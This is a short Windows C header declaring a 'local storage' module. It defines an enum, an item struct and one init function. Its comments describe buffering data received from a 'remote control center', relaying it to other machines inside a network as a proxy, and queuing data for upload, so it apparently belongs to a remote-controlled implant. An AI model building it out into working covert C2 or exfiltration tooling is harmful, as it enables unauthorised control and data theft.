/*
	LocalStorage.h
	Header file for the Local Storage module.
	Provides API for storing information chunks locally to be processed later.
*/

#pragma once

#include <windows.h>

// Enumeration for the source of storage items
typedef enum StorageItemSourceEnum {
	SI_ERROR = 0,						// Not defined source, assumed to be an error
	SI_FROM_REMOTE_CONTROL_CENTER,		// Data got from remote controller server, to be sent to some machine inside of network (if node is acting as proxy for others)
	SI_FOR_REMOTE_CONTROL_CENTER,		// Data to be uploaded to remote machine

	SI_MAXVALUE = 255					// Max value to fit BYTE in serialized version of structure
} StorageItemSourceEnum;

// Structure describing an item from local storage in a memory linked list
typedef struct _LOCAL_STORAGE_ITEM {
	StorageItemSourceEnum siSource;		// Type of source which created this item
	DWORD dwItemUniqId;					// Unique ID of the item

	LPVOID pData;						// Encoded and/or packed data
	SIZE_T lDataLen;					// Length of data in ^

} LOCAL_STORAGE_ITEM, *PLOCAL_STORAGE_ITEM;

// Function declarations
VOID lsInitLocalStorage();
